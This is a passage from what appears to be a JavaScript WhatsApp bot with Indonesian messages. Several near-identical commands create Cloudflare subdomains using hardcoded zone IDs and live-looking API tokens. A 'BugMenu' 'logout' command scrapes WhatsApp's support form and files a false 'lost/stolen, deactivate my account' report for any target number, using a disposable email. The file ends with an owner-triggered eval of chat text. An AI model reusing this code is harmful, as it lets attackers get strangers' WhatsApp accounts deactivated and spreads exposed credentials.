           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┃ Ip = ${e['ip']}
┣━━━━━━━━━━━━━━━━━━━
┃ Username = ${e['name']}
┣━━━━━━━━━━━━━━━━━━━
┃ Create By = ${ownerName}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain11': {
    if (!jangan) return m.reply(`Maaf Tod Fitur Ini Hanya Dapat Di Gunakan Di Grup Tertentu`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "6e54db622bb8682bdf42316953b5401d";
               let apitoken = "OwvvvI_MTLmsl2O5NnlzvPOfJfkNJlU2IAwA3wGH";
               let tld = "biistoreee.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply(`Penggunaan ${prefix + command} Host|Ip`);
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┃ Ip = ${e['ip']}
┣━━━━━━━━━━━━━━━━━━━
┃ Username = ${e['name']}
┣━━━━━━━━━━━━━━━━━━━
┃ Create By = ${ownerName}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           break
           case 'domain12': {
    if (!jangan) return m.reply(`Maaf Tod Fitur Ini Hanya Dapat Di Gunakan Di Grup Tertentu`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "92fffa5f2cce4005a30e3950620cb97d";
               let apitoken = "DXKGBd9zzFMsQjCirVRqO8nwE06imW8KyGpOqnwC";
               let tld = "putraoffc.site";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply(`Penggunaan ${prefix + command} Host|Ip`);
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┃ Ip = ${e['ip']}
┣━━━━━━━━━━━━━━━━━━━
┃ Username = ${e['name']}
┣━━━━━━━━━━━━━━━━━━━
┃ Create By = ${ownerName}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
        
        break
           case 'domain13': {
    if (!jangan) return m.reply(`Maaf Tod Fitur Ini Hanya Dapat Di Gunakan Di Grup Tertentu`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e03420325af30aaed049cbcc4c3381ed";
               let apitoken = "SoEzG_hcx8trsYCG-YoxD3U3Tw6eKTbUxDZnokLn";
               let tld = "putraoffc.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply(`Penggunaan ${prefix + command} Host|Ip`);
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┃ Ip = ${e['ip']}
┣━━━━━━━━━━━━━━━━━━━
┃ Username = ${e['name']}
┣━━━━━━━━━━━━━━━━━━━
┃ Create By = ${ownerName}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain14': {
    if (!jangan) return m.reply(`Maaf Tod Fitur Ini Hanya Dapat Di Gunakan Di Grup Tertentu`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ba86d80050aa5a2343a8e456c85c32f0";
               let apitoken = "vvAcoh_BQOZ1u-jb7ORkH1YZDXOEoiA7dBovCcCs";
               let tld = "kangpannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply(`Penggunaan ${prefix + command} Host|Ip`);
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┃ Ip = ${e['ip']}
┣━━━━━━━━━━━━━━━━━━━
┃ Username = ${e['name']}
┣━━━━━━━━━━━━━━━━━━━
┃ Create By = ${ownerName}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           break
//--------------------------------------------------------------------------------------------------\\
//BugMenu
case 'verify': 
case 'logout':  {
if (!isCreator) return m.reply(mess.owner)
if (m.quoted || q) {
const froms = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')
var cekno = await rizzpiw.onWhatsApp(froms)
if (cekno.length == 0) return m.reply(`Peserta tersebut sudah tidak terdaftar di WhatsApp`)
var targetnya = froms.split('@')[0]
try {
var axioss = require('axios')
var ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
var email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
var cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
var $ = cheerio.load(ntah.data)
var $form = $("form");
var url = new URL($form.attr("action"), "https://www.whatsapp.com").href
var form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

var res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
var payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`Succes, No ${targetnya} Telah logout`)
} else if (payload.includes(`"payload":false`)) {
m.reply(`Hai ${pushname} Saat Ini Belum Dapat Melogout kan Mohon Untuk Menunggu Beberapa Saat`)
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply('Masukkan nomor target!')
}
break
//━━━━━━━━━━━━━━━[ BATAS MENU ]━━━━━━━━━━━━━━━━━//
    
default:
}
if (budy.startsWith('>')) {
if (!isCreator) return m.reply(mess.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}
} catch (err) {
m.reply(util.format(err))
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.yellowBright(`Update File Terbaru ${__filename}`))
delete require.cache[file]
require(file)
})